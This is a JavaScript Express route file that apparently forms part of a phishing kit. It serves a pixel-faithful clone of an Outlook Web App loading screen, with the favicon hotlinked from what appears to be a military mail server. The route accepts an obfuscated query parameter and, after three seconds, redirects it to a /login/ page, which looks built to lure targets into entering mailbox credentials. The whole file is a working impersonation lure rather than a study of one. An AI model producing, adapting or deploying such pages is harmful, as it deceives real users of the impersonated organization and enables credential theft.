
const express = require ('express');
const router = express.Router();

router.use(express.static('public'));


//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.yyyrl657jjghjoyhgfhnbjkfsdfiowerierehjre;

    const url = `/login/?dhsfiourewjdfjgkfdgkldfjiorejfdjgfdgjkdfjgreioo=${data2}`;

      if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
        <!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=10" />
<meta http-equiv="pragma" content="no-cache" />
<link rel="shortcut icon" href="https://mail.airforce.lk/owa/auth/15.2.1258/themes/resources/favicon.ico" type="image/x-icon">
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="default" />
<meta name="format-detection" content="telephone=no" />
<meta name="viewport" content="user-scalable=0, width=device-width, initial-scale=1.0, maximum-scale=1.0" />
<meta name="msapplication-TileImage" content="prem/15.0.1497.2/resources/images/0/owa_browserpinnedtile.png" />
<meta name="msapplication-TileColor" content="#0072c6" />
<meta name="msapplication-tap-highlight" content="no" />
<meta name="google" value="notranslate">
<meta name="apple-mobile-web-app-title" content="OWA" />
<title>Outlook Web App</title>
<meta http-equiv="REFRESH" content="03; url=${url}">



<style>
        
                @font-face {
                    font-family: "Segoe UI WPC";
                    src: url('prem/15.0.1497.2/resources/styles/segoeui-regular.woff') format('woff'),
                            url('prem/15.0.1497.2/resources/styles/segoeui-regular.ttf') format('truetype');
                }
                @font-face {
                    font-family: "Segoe UI WPC Semibold";
                    src: url('prem/15.0.1497.2/resources/styles/segoeui-semibold.woff') format('woff'),
                            url('prem/15.0.1497.2/resources/styles/segoeui-semibold.ttf') format('truetype');
                    font-weight: bold;
                }
             
            @font-face {
                font-family: "Segoe UI WPC Semilight";
                src: url('prem/15.0.1497.2/resources/styles/segoeui-semilight.woff') format('woff'),
                        url('prem/15.0.1497.2/resources/styles/segoeui-semilight.ttf') format('truetype');
            }
            

        @font-face {
            font-family: 'webfontPreload';
            src: url('prem/15.0.1497.2/resources/styles/office365icons.eot?#iefix') format('embedded-opentype'),
                 url('prem/15.0.1497.2/resources/styles/office365icons.woff') format('woff'),
                 url('prem/15.0.1497.2/resources/styles/office365icons.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }
      </style>
<style>
                .image-headerbgmain-png
                {
                    background:url('prem/15.0.1497.2/resources/themes/base/images/0/headerbgmain.png');
                    width: 1px;
                    height: 1px;
                }

                .image-headerbgright-png
                {
                    background:url('prem/15.0.1497.2/resources/themes/base/images/0/headerbgright.png');
                    width: 1px;
                    height: 1px;
                }

                .image-headerbgleft-png
                {
                    background:url('prem/15.0.1497.2/resources/themes/base/images/0/headerbgleft.png');
                    width: 1px;
                    height: 1px;
                }
            </style>
<style>/*---------------------------------------------
    NativeScrollRegion styles
----------------------------------------------*/

.customScrollBar::-webkit-scrollbar
{
    height: 18px;
    width: 18px;
}

.customScrollBar::-webkit-scrollbar:disabled
{
    display:none;
}

.customScrollBar::-webkit-scrollbar-button   
{
    background-color: #fff;
    background-repeat: no-repeat;
    cursor:pointer;
}

.customScrollBar::-webkit-scrollbar-button:horizontal:increment,
.customScrollBar::-webkit-scrollbar-button:horizontal:decrement,
.customScrollBar::-webkit-scrollbar-button:horizontal:increment:hover,
.customScrollBar::-webkit-scrollbar-button:horizontal:decrement:hover,
.customScrollBar::-webkit-scrollbar-button:vertical:increment,
.customScrollBar::-webkit-scrollbar-button:vertical:decrement,
.customScrollBar::-webkit-scrollbar-button:vertical:increment:hover,
.customScrollBar::-webkit-scrollbar-button:vertical:decrement:hover
{
    background-position:center;
    height: 18px;
    width: 18px;
}

.customScrollBarLight::-webkit-scrollbar-button 
{
    display: none;
}

.customScrollBar::-webkit-scrollbar-track
{
    background-color: #fff;
}

.customScrollBarLight::-webkit-scrollbar-track
{
    background-color: #0072C6;
}

.customScrollBar::-webkit-scrollbar-thumb
{
    border-radius: 9px;
    border: solid 6px #fff;
    background-color: #c8c8c8;
}

.customScrollBarLight::-webkit-scrollbar-thumb
{
    border-color: #0072C6;
    background-color: #95B1C1;
}

.customScrollBar::-webkit-scrollbar-thumb:vertical
{
    min-height:50px;
}

.customScrollBar::-webkit-scrollbar-thumb:horizontal
{
    min-width:50px;
}

.customScrollBar::-webkit-scrollbar-thumb:hover
{
    border-radius: 9px;
    border: solid 6px #fff;
    background-color: #98A3A6;
}

.customScrollBar::-webkit-scrollbar-corner
{
    background-color: #fff;
}

.nativeScrollInertia
{
    -webkit-overflow-scrolling: touch;
}

/* 
    This rule is stated here, rather than in the stylesheet 
    generated by CssSpritesGen2, because we want this to be 
    the default while allowing templates to override to 
    display as a full block element.
*/
.csimg 
{
    display: inline-block;
    overflow: hidden;
}

/*-------------------------------------
    Firefox button fix (removes extra
    button padding) 
--------------------------------------*/
button::-moz-focus-inner
{ 
    border-width: 0;
    padding: 0;
}

/*-------------------------------------
    TextBox styles
--------------------------------------*/
.textbox
{
    border-width: 1px;
    border-style: solid;
    font-size: 12px;
    border-radius: 0;
    -moz-border-radius: 0;
    -webkit-border-radius: 0;
    box-shadow: none;
    -moz-box-shadow: none;
    -webkit-box-shadow: none;
    -webkit-appearance:none;
    height: 14px;
    background-color: #fff;
}

.mouse .textbox 
{
    padding: 3px 5px;
}

.twide .textbox, .tnarrow .textbox
{
    padding: 7px 5px;
    height: 22px;
}

.textbox:hover
{
    border-color:#666666;
    background-color: #fff;
}

.placeholderText
{
    font: 12px 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
    color: #a6a6a6;
}

/*-------------------------------------
    Text area styles
-------------------------------------*/
.twide .textarea, .tnarrow .textarea, .textarea
{
    padding: 10px;
}

.mouse .textarea:hover
{
    background-color: transparent;
    border-color: transparent;
}

/*---------------------------------------------
    Button styles
----------------------------------------------*/

.o365button
{
    background: transparent;
    border-width: 0px;
    padding: 0px;
    cursor: pointer !important;
}

.o365button:disabled
{
    cursor: default !important;
}

.o365buttonOutlined
{
    padding-right: 11px;
    padding-left: 11px;
    -webkit-box-sizing: border-box; /* Safari/Chrome, other WebKit */
    -moz-box-sizing: border-box;    /* Firefox, other Gecko */
    box-sizing: border-box;         /* Opera/IE 8+ */
    border-width: 1px;
    border-style: solid;
}

.o365buttonOutlined .o365buttonLabel
{
    display:inline-block;
}

.o365buttonOutlined
{
    height: 22px;
}

.o365buttonOutlined .o365buttonLabel
{
    height: 18px;
}

/*-------------------------------------
    Checkbox styles
--------------------------------------*/

.checkbox
{
    border-style:none;
    cursor:pointer;
    vertical-align:middle;
}

/*---------------------------------------------
    Popup styles
----------------------------------------------*/
.popupShadow 
{
    box-shadow: 0 0 20px rgba(0,0,0,.4);
    border: 1px solid #eaeaea;
}

.contextMenuDropShadow 
{
    box-shadow: 0 0 7px rgba(0,0,0,.4);
    border: 1px solid #eaeaea;
}

.modalBackground
{
    background-color: #fff;
    height: 100%;
    width: 100%;
    opacity: 0.65;
    filter: Alpha(opacity=65); /* Internet Explorer */
}

.clearModalBackground
{
    /* We use a white background with opacity 0 rather than background-color transparent so that
       the browser won't allow the user click/touch to propagate to the control beneath it. */
    background-color: #fff;    /* UX Approved */
    opacity: 0;
    filter: Alpha(opacity=0); /* Internet Explorer */
    height: 100%;
    width: 100%;
}

/*---------------------------------------------
    Context Menu styles
----------------------------------------------*/

.contextMenuPopup 
{
    background-color: #fff;
}

.tnarrow .contextMenuPopup
{
    height: 100%;
}


/*---------------------------------------------
    Focus Highlight Behavior styles
----------------------------------------------*/
.removeFocusOutline *:focus
{
    outline: none;
}

.addFocusOutline button:focus 
{
    outline: dotted 1px;
}

/* transparent defaults */
.border-color-transparent 
{
    border-color: transparent;
}

/*-------------------------------------
    DockPanel styles
--------------------------------------*/
.vResize, .hResize
{
    z-index: 1000;
}

.hResize, .hResizeCursor *
{
    cursor: row-resize !important;
}

.vResize, .vResizeCursor *
{
    cursor: col-resize !important;
}

.vResizing, .hResizing
{
    filter: alpha(opacity=60);
    opacity: 0.6;
    -moz-opacity: 0.6;
    border: solid 1px #fff;
}

.vResizing
{
    border-width: 0px 1px;
}

.hResizing
{
    border-width: 1px 0px;
}
</style>
<style>/*Font Classes*/
.ms-font-su
{
    font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    font-size: 42px;
    color: #333333;
}

.ms-font-xxl
{
    font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    font-size: 28px;
    color: #333333;
}

.twide .ms-font-xxl, .tnarrow .ms-font-xxl
{
    font-size: 30px;
}

.ms-font-xl
{
    font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    font-size: 21px;
    color: #333333;
}

.twide .ms-font-xl, .tnarrow .ms-font-xl
{
    font-size: 22px;
}

.ms-font-l
{
    font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
    font-size: 17px;
    color: #333333;
}

.twide .ms-font-l, .tnarrow .ms-font-l
{
    font-size: 18px;
}

.ms-font-m
{
    font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
    font-size: 14px;
    color: #333333;
}

.twide .ms-font-m, .tnarrow .ms-font-m
{
    font-size: 15px;
}

.ms-font-s
{
    font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
    font-size: 12px;
    color: #333333;
}

.twide .ms-font-s, .tnarrow .ms-font-s
{
    font-size: 13px;
}

.ms-font-xs
{
    font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
    font-size: 11px;
    color: #333333;
}

.twide .ms-font-xs, .tnarrow .ms-font-xs
{
    font-size: 12px;
}

.ms-font-mi
{
    font-weight: bold;
    font-family: 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI WPC Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    font-size: 10px;
    color: #333333;
}

.twide .ms-font-mi, .tnarrow .ms-font-mi
{
    font-size: 11px;
}

/*Font Weights*/
.ms-font-weight-light
{
    font-family: 'Segoe UI Light', 'Segoe WP Light', 'Segoe UI WPC Semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.ms-font-weight-semilight
{
    font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.ms-font-weight-regular
{
    font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
}

.ms-font-weight-semibold
{
    font-weight: bold;
    font-family: 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI WPC Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}</style>
<style>/*Background Colors*/
.ms-bg-color-themeDark,
.ms-bgc-td,
.ms-bg-color-themeDark-hover:hover,
.ms-bgc-td-h:hover
{
    background-color: #005A9E;
}

.ms-bg-color-themeDarker,
.ms-bgc-tdr,
.ms-bg-color-themeDarker-hover:hover,
.ms-bgc-tdr-h:hover
{
    background-color: #004578;
}

.ms-bg-color-themePrimary,
.ms-bgc-tp,
.ms-bg-color-themePrimary-hover:hover,
.ms-bgc-tp-h:hover
{
    background-color: #0072C6;
}

.ms-bg-color-themeSecondary,
.ms-bgc-ts,
.ms-bg-color-themeSecondary-hover:hover,
.ms-bgc-ts-h:hover
{
    background-color: #2A8DD4;
}

.ms-bg-color-themeTertiary,
.ms-bgc-tt,
.ms-bg-color-themeTertiary-hover:hover,
.ms-bgc-tt-h:hover
{
    background-color: #92C0E0;
}

.ms-bg-color-themeLight,
.ms-bgc-tl,
.ms-bg-color-themeLight-hover:hover,
.ms-bgc-tl-h:hover
{
    background-color: #CDE6F7;
}

.ms-bg-color-themeLighter,
.ms-bgc-tlr,
.ms-bg-color-themeLighter-hover:hover,
.ms-bgc-tlr-h:hover
{
    background-color: #E6F2FA;
}

/*Border Colors*/
.ms-border-color-themeDark,
.ms-bcl-td,
.ms-border-color-themeDark-hover:hover,
.ms-bcl-td-h:hover
{
    border-color: #005A9E;
}

.ms-border-color-themeDarker,
.ms-bcl-tdr,
.ms-border-color-themeDarker-hover:hover,
.ms-bcl-tdr-h:hover
{
    border-color: #004578;
}

.ms-border-color-themePrimary,
.ms-bcl-tp,
.ms-border-color-themePrimary-hover:hover,
.ms-bcl-tp-h:hover
{
    border-color: #0072C6;
}

.ms-border-color-themeSecondary,
.ms-bcl-ts,
.ms-border-color-themeSecondary-hover:hover,
.ms-bcl-ts-h:hover
{
    border-color: #2A8DD4;
}

.ms-border-color-themeTertiary,
.ms-bcl-tt,
.ms-border-color-themeTertiary-hover:hover,
.ms-bcl-tt-h:hover
{
    border-color: #92C0E0;
}

.ms-border-color-themeLight,
.ms-bcl-tl,
.ms-border-color-themeLight-hover:hover,
.ms-bcl-tl-h:hover
{
    border-color: #CDE6F7;
}

.ms-border-color-themeLighter,
.ms-bcl-tlr,
.ms-border-color-themeLighter-hover:hover,
.ms-bcl-tlr-h:hover
{
    border-color: #E6F2FA;
}

/*Foreground colors*/
.ms-font-color-themeDark,
.ms-fcl-td,
.ms-font-color-themeDark-hover:hover,
.ms-fcl-td-h:hover
{
    color: #005A9E;
}

.ms-font-color-themeDarker,
.ms-fcl-tdr,
.ms-font-color-themeDarker-hover:hover,
.ms-fcl-tdr-h:hover
{
    color: #004578;
}

.ms-font-color-themePrimary,
.ms-fcl-tp,
.ms-font-color-themePrimary-hover:hover,
.ms-fcl-tp-h:hover
{
    color: #0072C6;
}

.ms-font-color-themeSecondary,
.ms-fcl-ts,
.ms-font-color-themeSecondary-hover:hover,
.ms-fcl-ts-h:hover
{
    color: #2A8DD4;
}

.ms-font-color-themeTertiary,
.ms-fcl-tt,
.ms-font-color-themeTertiary-hover:hover,
.ms-fcl-tt-h:hover
{
    color: #92C0E0;
}

.ms-font-color-themeLight,
.ms-fcl-tl,
.ms-font-color-themeLight-hover:hover,
.ms-fcl-tl-h:hover
{
    color: #CDE6F7;
}

.ms-font-color-themeLighter,
.ms-fcl-tlr,
.ms-font-color-themeLighter-hover:hover,
.ms-fcl-tlr-h:hover
{
    color: #E6F2FA;
}

/* Suite overrides */
.o365cs-topnavBGColor
{
    background-color: #0072C6;
}
.o365cs-topnavLinkBackground
{
    background-color: #0072C6;
    background-color: rgba(0,114,198,.8);
}
.o365cs-topnavText
{
    color: #FFFFFF;
}
.o365cs-o365logo
{
    color: #FFFFFF;
}
.o365cs-navMenuButton
{
    color: #FFFFFF;
}</style>
<style>/*Background Colors*/
.ms-bg-color-black,
.ms-bgc-b,
.ms-bg-color-black-hover:hover,
.ms-bgc-b-h:hover
{
    background-color: #000;
}

.ms-bg-color-neutralDark,
.ms-bgc-nd,
.ms-bg-color-neutralDark-hover:hover,
.ms-bgc-nd-h:hover
{
    background-color: #212121;
}

.ms-bg-color-neutralPrimary,
.ms-bgc-np,
.ms-bg-color-neutralPrimary-hover:hover,
.ms-bgc-np-h:hover
{
    background-color: #333;
}

.ms-bg-color-neutralSecondary,
.ms-bgc-ns,
.ms-bg-color-neutralSecondary-hover:hover,
.ms-bgc-ns-h:hover
{
    background-color: #666;
}

.ms-bg-color-neutralSecondaryAlt,
.ms-bgc-nsa,
.ms-bg-color-neutralSecondaryAlt-hover:hover,
.ms-bgc-nsa-h:hover
{
    background-color: #767676;
}

.ms-bg-color-neutralTertiary,
.ms-bgc-nt,
.ms-bg-color-neutralTertiary-hover:hover,
.ms-bgc-nt-h:hover
{
    background-color: #a6a6a6;
}

.ms-bg-color-neutralTertiaryAlt,
.ms-bgc-nta,
.ms-bg-color-neutralTertiaryAlt-hover:hover,
.ms-bgc-nta-h:hover
{
    background-color: #c8c8c8;
}

.ms-bg-color-neutralLight,
.ms-bgc-nl,
.ms-bg-color-neutralLight-hover:hover,
.ms-bgc-nl-h:hover
{
    background-color: #eaeaea;
}

.ms-bg-color-neutralLighter,
.ms-bgc-nlr,
.ms-bg-color-neutralLighter-hover:hover,
.ms-bgc-nlr-h:hover
{
    background-color: #f4f4f4;
}

.ms-bg-color-white,
.ms-bgc-w,
.ms-bg-color-white-hover:hover,
.ms-bgc-w-h:hover
{
    background-color: #fff;
}

/*Border Colors*/
.ms-border-color-black,
.ms-bcl-b,
.ms-border-color-black-hover:hover,
.ms-bcl-b-h:hover
{
    border-color: #000;
}

.ms-border-color-neutralDark,
.ms-bcl-nd,
.ms-border-color-neutralDark-hover:hover,
.ms-bcl-nd-h:hover
{
    border-color: #212121;
}

.ms-border-color-neutralPrimary,
.ms-bcl-np,
.ms-border-color-neutralPrimary-hover:hover,
.ms-bcl-np-h:hover
{
    border-color: #333;
}

.ms-border-color-neutralSecondary,
.ms-bcl-ns,
.ms-border-color-neutralSecondary-hover:hover,
.ms-bcl-ns-h:hover
{
    border-color: #666;
}

.ms-border-color-neutralSecondaryAlt,
.ms-bcl-nsa,
.ms-border-color-neutralSecondaryAlt-hover:hover,
.ms-bcl-nsa-h:hover
{
    border-color: #767676;
}

.ms-border-color-neutralTertiary,
.ms-bcl-nt,
.ms-border-color-neutralTertiary-hover:hover,
.ms-bcl-nt-h:hover
{
    border-color: #a6a6a6;
}

.ms-border-color-neutralTertiaryAlt,
.ms-bcl-nta,
.ms-border-color-neutralTertiaryAlt-hover:hover,
.ms-bcl-nta-h:hover
{
    border-color: #c8c8c8;
}

.ms-border-color-neutralLight,
.ms-bcl-nl,
.ms-border-color-neutralLight-hover:hover,
.ms-bcl-nl-h:hover
{
    border-color: #eaeaea;
}

.ms-border-color-neutralLighter,
.ms-bcl-nlr,
.ms-border-color-neutralLighter-hover:hover,
.ms-bcl-nlr-h:hover
{
    border-color: #f4f4f4;
}

.ms-border-color-white,
.ms-bcl-w,
.ms-border-color-white-hover:hover,
.ms-bcl-w-h:hover
{
    border-color: #fff;
}

/*Foreground colors*/
.ms-font-color-black,
.ms-fcl-b,
.ms-font-color-black-hover:hover,
.ms-fcl-b-h:hover
{
    color: #000;
}

.ms-font-color-neutralDark,
.ms-fcl-nd,
.ms-font-color-neutralDark-hover:hover,
.ms-fcl-nd-h:hover
{
    color: #212121;
}

.ms-font-color-neutralPrimary,
.ms-fcl-np,
.ms-font-color-neutralPrimary-hover:hover,
.ms-fcl-np-h:hover
{
    color: #333;
}

.ms-font-color-neutralSecondary,
.ms-fcl-ns,
.ms-font-color-neutralSecondary-hover:hover,
.ms-fcl-ns-h:hover
{
    color: #666;
}

.ms-font-color-neutralSecondaryAlt,
.ms-fcl-nsa,
.ms-font-color-neutralSecondaryAlt-hover:hover,
.ms-fcl-nsa-h:hover
{
    color: #767676;
}

.ms-font-color-neutralTertiary,
.ms-fcl-nt,
.ms-font-color-neutralTertiary-hover:hover,
.ms-fcl-nt-h:hover
{
    color: #a6a6a6;
}

.ms-font-color-neutralTertiaryAlt,
.ms-fcl-nta,
.ms-font-color-neutralTertiaryAlt-hover:hover,
.ms-fcl-nta-h:hover
{
    color: #c8c8c8;
}

.ms-font-color-neutralLight,
.ms-fcl-nl,
.ms-font-color-neutralLight-hover:hover,
.ms-fcl-nl-h:hover
{
    color: #eaeaea;
}

.ms-font-color-neutralLighter,
.ms-fcl-nlr,
.ms-font-color-neutralLighter-hover:hover,
.ms-fcl-nlr-h:hover
{
    color: #f4f4f4;
}

.ms-font-color-white,
.ms-fcl-w,
.ms-font-color-white-hover:hover,
.ms-fcl-w-h:hover
{
    color: #fff;
}</style>
<style>/*--------------------------------------------------------
  OWA styles, font and color classes that are only used within OWA
---------------------------------------------------------*/
.owa-font-compose
{
    font-family: Calibri,Arial,Helvetica,sans-serif;
}
.owa-bg-color-neutral-orange
{
    background-color: #D82300;
}
.owa-bg-color-neutral-red
{
    background-color: #A80F22;
}
.owa-bg-color-neutral-yellow
{
    background-color: #FFEE94;
}
.owa-bg-color-neutral-green
{
    background-color: #5DD255;
}
.owa-bg-color-cal-green
{
    background-color: #68A490;
}
.owa-bg-color-cal-purple
{
    background-color: #976CBE;
}
.owa-border-color-neutral-orange
{
    border-color: #D82300;
}
.owa-border-color-neutral-red
{
    border-color: #A80F22;
}
.owa-border-color-neutral-yellow
{
    border-color: #FFEE94;
}
.owa-border-color-neutral-green
{
    border-color: #5DD255;
}
.owa-border-color-cal-green
{
    border-color: #68A490;
}
.owa-border-color-cal-purple
{
    border-color: #976CBE;
}
.owa-color-neutral-orange
{
    color: #D82300;
}
.owa-color-neutral-red
{
    color: #A80F22;
}
.owa-color-neutral-yellow
{
    color: #FFEE94;
}
.owa-color-neutral-green
{
    color: #5DD255;
}
.owa-color-cal-green
{
    color: #68A490;
}
.owa-color-cal-green-hover
{
    color: #377353;
}
.owa-color-cal-purple
{
    color: #976CBE;
}
.owa-color-cal-purple-hover
{
    color: #67397B;
}
.owa-color-cal-blue
{
    color: #71C2EB;
}
.owa-color-cal-brown
{
    color: #AB9B81;
}
.owa-color-cal-green-alt
{
    color: #A9C47A;
}
.owa-color-cal-grey
{
    color: #999B9C;
}
.owa-color-cal-orange
{
    color: #E6975C;
}
.owa-color-cal-pink
{
    color: #CA6AAB;
}
.owa-color-cal-red
{
    color: #D57272;
}
.owa-color-cal-teal
{
    color: #7BCBC4;
}
.owa-color-cal-yellow
{
    color: #E3B75D;
}
.owa-color-folder-brown
{
    color: #EAC282;
}</style>
<script>
        // There's a bug in WP8 IE 10.0 where device-width on Lumia 920 is reported as actual width 
        // instead of css pixel width. This causes the UI to appear really tiny on high-res devices(OM:277530). 
        // There's also another bug in IE10.0 device-width causes divs to not scroll, 
        // even on non-high-res devices.(OM:281690).
        // These bugs are being fixed. In the meanwhile, the WP8 IE team recommended this workaround.
        (function () {
            if ("-ms-user-select" in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
                var msViewportStyle = document.createElement("style");
                msViewportStyle.appendChild(
                    document.createTextNode("@-ms-viewport{width:auto!important}")
                    );
                document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
            }
        })();
    </script>
<style>
        body
        {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
        }
        #owaLoading
        {
            background-color: #FFF;
            width: 100%;
            height: 100%;
            position: absolute;
            z-index: 10001;
        }
        
        #loadingLogo, #loadingSpinner, #statusText
        {
            display: block;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }
        
        #loadingLogo
        {
            padding-top: 174px;
            padding-bottom: 22px;
        }
        
        .tnarrow #loadingLogo
        {
            padding-top: 52px;
        }

        #statusText
        {
            color: #0072c6;
            font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
            font-size: 12px;
            margin-top: 20px;
        }

        #statusText > span
        {
            display: none;
            margin-left: auto;
            margin-right: auto;
            line-height: 11px;
        }

        #statusText.script > .script
        {
            display: inline;
        }

        #statusText.scriptDelay > .scriptDelay
        {
            display: inline;
        }

        #statusText.data > .data
        {
            display: inline;
        }

        #statusText.dataDelay > .dataDelay
        {
            display: inline;
        }

        #statusText.render > .render
        {
            display: inline;
        }
    </style>
</head>
<!--[if IE 8 ]> <body class="ie8"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!--> <body class="notIE8"> <!--<![endif]-->
<div id="owaLoading">
<img id="loadingLogo" alt="Outlook Web App" src="./files/Untitled.png" />
<style>
        /******* ActivityIndicator loadingSpinner *******/
        /* Note: The CSS loadingSpinner animation should be in sync
        with the css from animations.css in the owa client code */
   
        .loadingSpinnerContainer {
            width: 32px;
            height: 32px;
            display: block;
            vertical-align: top;
            margin-left: auto;
            margin-right: auto;
        }

        .smallSpinner 
        {
            width: 16px;
            height: 16px;
        }

        .loadingSpinner
        {
            width: 28px;
            height: 28px;
            position: relative;
            padding: 4px 0 0 4px;
            overflow: hidden;

            -webkit-animation-duration: 1000ms;
            -webkit-animation-iteration-count: infinite;
            -webkit-animation-timing-function: steps(8, end);
            -webkit-animation-name: rotate;

            -moz-animation-duration: 1000ms;
            -moz-animation-iteration-count: infinite;
            -moz-animation-timing-function: steps(8, end);
            -moz-animation-name: rotate;

            -ms-animation-duration: 1000ms;
            -ms-animation-iteration-count: infinite;
            -ms-animation-timing-function: steps(8, end);
            -ms-animation-name: rotate;

            animation-duration: 1000ms;
            animation-iteration-count: infinite;
            animation-timing-function: steps(8, end);
            animation-name: rotate;
        }

        .smallSpinner > .loadingSpinner
        {
            width: 14px;
            height: 14px;
            padding: 2px 0 0 2px;
        }

        @-webkit-keyframes rotate {
            from {
                -webkit-transform: rotate(0deg);
            }
            to {
                -webkit-transform: rotate(360deg);
            }
        }

        @-moz-keyframes rotate {
            from {
                -moz-transform: rotate(0deg);
            }
            to {
                -moz-transform: rotate(360deg);
            }
        }

        @-ms-keyframes rotate {
            from {
                -ms-transform: rotate(0deg);
            }
            to {
                -ms-transform: rotate(360deg);
            }
        }

        @keyframes rotate {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .loadingSpinner > .loadingBall {
            width: 6px;
            height: 6px;
            border-radius: 100%;
            position: absolute;

            -webkit-transform-origin: 12px 12px;
            -moz-transform-origin: 12px 12px;
            -ms-transform-origin: 12px 12px;
            transform-origin: 12px 12px;
        }

        .smallSpinner > .loadingSpinner > .loadingBall 
        {
            width: 3px;
            height: 3px;

            -webkit-transform-origin: 6px 6px;
            -moz-transform-origin: 6px 6px;
            -ms-transform-origin: 6px 6px;
            transform-origin: 6px 6px;
        }

        .loadingSpinner > .loadingBall:nth-child(1) {

            -webkit-transform: rotate(45deg);
            -moz-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            transform: rotate(45deg);
        }

        .loadingSpinner > .loadingBall:nth-child(2) 
        {
            opacity: .8;

            -webkit-transform: rotate(0deg);
            -moz-transform: rotate(0deg);
            -ms-transform: rotate(0deg);
            transform: rotate(0deg);
        }

        .loadingSpinner > .loadingBall:nth-child(3) {
            opacity: .6;

            -webkit-transform: rotate(-45deg);
            -moz-transform: rotate(-45deg);
            -ms-transform: rotate(-45deg);
            transform: rotate(-45deg);
        }

        .loadingSpinner > .loadingBall:nth-child(4) {
            opacity: .4;

            -webkit-transform: rotate(-90deg);
            -moz-transform: rotate(-90deg);
            -ms-transform: rotate(-90deg);
            transform: rotate(-90deg);
        }

        .loadingSpinner > .loadingBall:nth-child(5) {
            opacity: .25;

            -webkit-transform: rotate(-135deg);
            -moz-transform: rotate(-135deg);
            -ms-transform: rotate(-135deg);
            transform: rotate(-135deg);
        }

        .loadingSpinner > .loadingBall:nth-child(6) {
            opacity: .15;

            -webkit-transform: rotate(-180deg);
            -moz-transform: rotate(-180deg);
            -ms-transform: rotate(-180deg);
            transform: rotate(-180deg);
        }

        .loadingSpinner > .loadingBall:nth-child(7) {
            opacity: .075;

            -webkit-transform: rotate(-225deg);
            -moz-transform: rotate(-225deg);
            -ms-transform: rotate(-225deg);
            transform: rotate(-225deg);
        }

        .loadingSpinner > .loadingBall:nth-child(8) {
            opacity: .05;

            -webkit-transform: rotate(-270deg);
            -moz-transform: rotate(-270deg);
            -ms-transform: rotate(-270deg);
            transform: rotate(-270deg);
        }

        .loadingBallColor 
        {
            background: #0072c6;
        }
      </style>
<div dir="ltr" class="loadingSpinnerContainer" id="cssloadingSpinnerContainer">
<div class="loadingSpinner loadingSpinnerAnimation">
<div class="loadingBall loadingBallColor"></div>
<div class="loadingBall loadingBallColor"></div>
<div class="loadingBall loadingBallColor"></div>
<div class="loadingBall loadingBallColor"></div>
<div class="loadingBall loadingBallColor"></div>
<div class="loadingBall loadingBallColor"></div>
<div class="loadingBall loadingBallColor"></div>
<div class="loadingBall loadingBallColor"></div>
</div>
</div>
<div id="statusText" class="script">
<span class="script">Starting...</span>
<span class="scriptDelay">Still working on it...</span>
<span class="data">Opening your mailbox...</span>
<span class="dataDelay">Still working on it...</span>
<span class="render">Almost there...</span>
</div>
</div>
<div id="preloadDiv" style="visibility:hidden;height: 1px; margin-bottom: -1px; overflow: hidden;">

<span style="font-family:&quot;Segoe UI WPC&quot;;">t</span>
<span style="font-family:&quot;Segoe UI WPC Semibold&quot;;">t</span>
<span style="font-family:&quot;Segoe UI WPC Semilight&quot;;">t</span>
<span style="font-family:&quot;webfontPreload&quot;;"></span>
.1497.2/resources/images/0/sprite1.mouse.png" />
<img src="prem/15.0.1497.2/resources/themes/base/images/0/headerbgmain.png" />
<img src="prem/15.0.1497.2/resources/themes/base/images/0/headerbgright.png" />
<img src="prem/15.0.1497.2/resources/images/0/folderpane_bg.png" />
</div>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon='{"rayId":"81b7b455c9cad055","r":1,"version":"2023.10.0","token":"e732b924938f4522897ce938cb4ee216"}' crossorigin="anonymous"></script>
</body>



</html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router;
